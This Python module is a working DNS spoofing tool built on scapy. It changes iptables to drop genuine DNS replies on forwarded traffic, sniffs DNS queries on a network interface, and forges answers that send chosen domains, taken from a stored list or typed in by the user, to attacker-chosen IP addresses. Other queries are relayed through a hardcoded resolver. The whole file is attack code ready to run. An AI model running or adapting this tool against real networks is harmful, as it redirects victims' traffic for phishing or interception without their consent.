'''This package contains everything related to DNS spoofing'''

import threading
import time
import click
from scapy.all import DNS, UDP, IP, DNSRR, send, sniff, DNSQR, sr1
from .domains import get_domains
from .general import get_interface
import subprocess



def spoof_dns_all(interface):
    '''
    Main function to spoof all dns domains stored in domains.json
    '''

    table = get_domains()
    click.echo("spoofing target using all stored domains")

    start_attack(table, interface)


def spoof_dns_single(interface):
    '''
    Main function to spoof domain entered by user
    '''

    domain = click.prompt('Which domain do you want to spoof? Please enter the domain without www.')
    ip = click.prompt('Which IP should it route to?')

    start_attack({domain: ip}, interface)


def start_attack(table, interface):
    '''
    Starts dns attack given a table chosen by user
    '''

    interface = get_interface(interface)
    print('setting ip tables')
    subprocess.run(['iptables', '-A', 'FORWARD', '-p', 'udp', '--sport', '53', '-j' 'DROP'])

    # Start subthread running attack
    stop_event = threading.Event()
    attack_thread = threading.Thread(target=attack, args=(table,interface,stop_event))
    attack_thread.start()

    try:
        # Wait for keyboard interrupt
        while True:
            time.sleep(2)
    except KeyboardInterrupt:
        # Set stop_event when keyboard interrupt occurs
        print('resetting ip tables')
        subprocess.run(['iptables', '-D', 'FORWARD', '-p', 'udp', '--sport', '53', '-j' 'DROP'])
        stop_event.set()
        attack_thread.join()


def attack(table, interface, stop_event):
    '''
    Sniffs network for DNS packets
    '''
    
    # Port used for sniffing dns queries
    port = "udp port 53"

    sniff(filter=port, iface=interface, prn=lambda pkt: analyze_packet(pkt, table, interface), stop_filter=stop_event.is_set())


def analyze_packet(packet, table, interface):
    '''
    Analyzes dns packets sniffed by attack
    '''

    # Check for proper DNS reqs only
    if not packet.haslayer(DNS) or not packet.haslayer(IP):
        return

    # Filter out answers
    if packet[DNS].qr != 0:
        return

    query_name = get_packet_query_name(packet[DNS])

    if query_name in table:
        click.echo(f'Found a query to spoof: {query_name}')
        
        spoof_packet(packet, query_name, table[query_name], interface)
        return
    else:
        click.echo(f'Sent the normal dns response')
        forward_dns(packet, query_name, interface)
        return


def spoof_packet(packet, spoofed_domain, spoofed_ip, interface):
    '''
    Creates a packet to spoof victim
    '''

    # Make DNS template message
    spoofed_reply = IP() / UDP() / DNS()

    # Swap source/dest for UDP and IP layers
    spoofed_reply[IP].src = packet[IP].dst
    spoofed_reply[IP].dst = packet[IP].src
    spoofed_reply[UDP].sport = packet[UDP].dport
    spoofed_reply[UDP].dport = packet[UDP].sport

    # Copy the ID
    spoofed_reply[DNS].id = packet[DNS].id

    # Set query to response
    spoofed_reply[DNS].qr = 1
    spoofed_reply[DNS].aa = 0

    # Pass the DNS Question Record to the resposne
    spoofed_reply[DNS].qd = packet[DNS].qd

    # Set spoofed answer
    spoofed_reply[DNS].an = DNSRR(rrname=spoofed_domain+'.', rdata=spoofed_ip, type="A", rclass="IN")

    click.echo("Sending spoofed packet")

    send(spoofed_reply, iface=interface)

def forward_dns(packet, requested_domain, interface):
    '''
    Forwards the normal dns response
    '''
    real_response = sr1(IP(dst='10.0.86.4')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=requested_domain)), verbose=0)
    real_ip = real_response[DNSRR].rdata
    # Make DNS template message
    actual_reply = IP() / UDP() / DNS()

    # Swap source/dest for UDP and IP layers
    actual_reply[IP].src = packet[IP].dst
    actual_reply[IP].dst = packet[IP].src
    actual_reply[UDP].sport = packet[UDP].dport
    actual_reply[UDP].dport = packet[UDP].sport

    # Copy the ID
    actual_reply[DNS].id = packet[DNS].id

    # Set query to response
    actual_reply[DNS].qr = 1
    actual_reply[DNS].aa = 0

    # Pass the DNS Question Record to the resposne
    actual_reply[DNS].qd = packet[DNS].qd

    # Set spoofed answer
    actual_reply[DNS].an = DNSRR(rrname=requested_domain, rdata=real_ip, type="A", rclass="IN")

    click.echo("Sending spoofed packet")

    send(actual_reply, iface=interface)


def get_packet_query_name(dns_packet):
    '''
    Gets the domain query without www. from a dns packet
    '''

    name = dns_packet.qd.qname[:-1].decode()

    # Remove "www." from the beginning of the name
    if name.startswith("www."):
        name = name[4:]

    return name
